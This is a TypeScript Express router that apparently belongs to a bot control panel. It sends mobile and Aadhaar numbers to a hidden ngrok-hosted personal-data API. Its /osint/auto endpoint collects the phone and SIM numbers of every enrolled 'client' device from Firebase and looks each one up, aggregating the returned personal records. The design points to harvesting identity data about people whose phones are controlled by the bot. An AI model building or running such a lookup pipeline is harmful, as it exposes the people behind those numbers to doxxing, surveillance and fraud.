import { Router } from "express";
import { fbGet } from "../bot/firebase";

/**
 * POST /api/osint/search
 * Proxies mobile/aadhar lookups to the ngrok data API:
 *   https://uncostly-silvia-semichemically.ngrok-free.dev/?k=na/<query>
 * Avoids CORS from the browser and keeps the ngrok URL server-side only.
 * Accepts { request } (mobile number or aadhar number).
 *
 * GET /api/osint/search?q=<query> — same lookup, for direct links/tests.
 * GET /api/osint/auto — auto-scans every device number and aggregates hits.
 */

const router = Router();

const DATA_API = "https://uncostly-silvia-semichemically.ngrok-free.dev/?k=na/";

async function lookup(query: string): Promise<any> {
  const res = await fetch(DATA_API + encodeURIComponent(query.trim()), {
    headers: { "ngrok-skip-browser-warning": "true" },
    signal: AbortSignal.timeout(25_000),
  });
  if (!res.ok) {
    throw new Error(`Data API responded ${res.status}`);
  }
  return res.json();
}
export { lookup };

router.post("/osint/search", async (req, res) => {
  try {
    const body = req.body ?? {};
    const request = (body.request || body.query || "").trim();
    if (!request) {
      res.status(400).json({ error: "request (mobile or aadhar number) is required" });
      return;
    }
    const json = await lookup(request);
    res.json(json);
  } catch (err: any) {
    console.error("OSINT proxy error:", err?.message || err);
    res.status(500).json({ error: err?.message || "OSINT proxy failed" });
  }
});

router.get("/osint/search", async (req, res) => {
  try {
    const q = String(req.query.q || "").trim();
    if (!q) {
      res.status(400).json({ error: "q (mobile or aadhar number) is required" });
      return;
    }
    const json = await lookup(q);
    res.json(json);
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "OSINT proxy failed" });
  }
});

/**
 * GET /api/osint/auto
 * Auto-fetches data for every user device: collects unique mobile numbers
 * from all clients (mobNo + SIM phone numbers), looks each one up on the
 * data API (sequential, bounded), and returns aggregated results.
 */
router.get("/osint/auto", async (req, res) => {
  try {
    const clients = (await fbGet("clients")) || {};
    const numbers = new Set<string>();

    const addNum = (n: any) => {
      if (!n) return;
      const digits = String(n).replace(/\D/g, "");
      if (/^[6-9]\d{9}$/.test(digits)) numbers.add(digits);
    };

    for (const [id, d] of Object.entries<any>(clients)) {
      if (id.startsWith("{") || id.startsWith("*")) continue;
      addNum(d?.mobNo);
      for (const s of d?.sims || []) addNum(s?.phoneNumber);
    }

    const list = [...numbers].slice(0, 10); // bounded: max 10 lookups
    const results: any[] = [];
    const scanned: string[] = [];
    for (const n of list) {
      scanned.push(n);
      try {
        const r = await lookup(n);
        if (Array.isArray(r.results)) {
          for (const hit of r.results) results.push({ ...hit, searched: n });
        }
      } catch {
        /* skip failed lookup, keep scanning */
      }
      await new Promise((ok) => setTimeout(ok, 800)); // be gentle with the API
    }

    res.json({
      message: `${results.length} record(s) from ${list.length} device number(s)`,
      results,
      scanned,
    });
  } catch (err: any) {
    console.error("OSINT auto-scan error:", err?.message || err);
    res.status(500).json({ error: err?.message || "Auto-scan failed" });
  }
});

export default router;